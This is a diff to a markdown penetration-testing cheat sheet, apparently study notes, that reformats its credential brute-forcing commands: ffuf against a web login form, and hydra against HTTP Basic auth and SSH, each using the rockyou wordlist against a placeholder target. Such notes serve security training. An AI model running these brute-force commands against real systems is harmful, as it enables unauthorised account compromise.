@@ -37,9 +37,9 @@ description: "Gaining Access step – a note for brute forcing passwords, login 
 
 ### FUFF
 
-WPSCAN> **<font color=red>ffuf -w </font>myUsersFile.txt<font color=red>:W1,</font><font color=lightblue>/usr/share/wordlists/rockyou.txt</font><font color=red>:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u</font> http://\[TARGET_IP\]/login <font color=red>-fc 200</font>**</br>
 
  > 
+ > **<font color=red>ffuf -w </font>myUsersFile.txt<font color=red>:W1,</font><font color=lightblue>/usr/share/wordlists/rockyou.txt</font><font color=red>:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u</font> http://\[TARGET_IP\]/login <font color=red>-fc 200</font>**</br>
  > Brute Force HTTP POST form with valid username.
 
 ---
@@ -59,7 +59,7 @@ WPSCAN> **<font color=red>ffuf -w </font>myUsersFile.txt<font color=red>:W1,</fo
 
 
  > 
- > **<font color=red>hydra -vV -l </font>myUser <font color=red>-P</font> /usr/share/wordlists/rockyou.txt \[TARGET_IP\]<font color=red>http-get</font> /path/**</br>
+ > **<font color=red>hydra -vV -l </font>myUser <font color=red>-P</font> /usr/share/wordlists/rockyou.txt \[TARGET_IP\]<font color=red> http-get</font> /path/**</br>
  > Brute Force HTTP Basic Access Authentication.
 
 # SSH
@@ -70,7 +70,7 @@ WPSCAN> **<font color=red>ffuf -w </font>myUsersFile.txt<font color=red>:W1,</fo
 
 
  > 
- > **<font color=red>hydra -L</font> myUsersFile <font color=red>-P</font> myPassFile \[TARGET_IP\]<font color=red>ssh</font>**</br>
+ > **<font color=red>hydra -L</font> myUsersFile <font color=red>-P</font> myPassFile \[TARGET_IP\]<font color=red> ssh</font>**</br>
  > Brute Force SSH.
 
 # SSH Private Key Passphrase
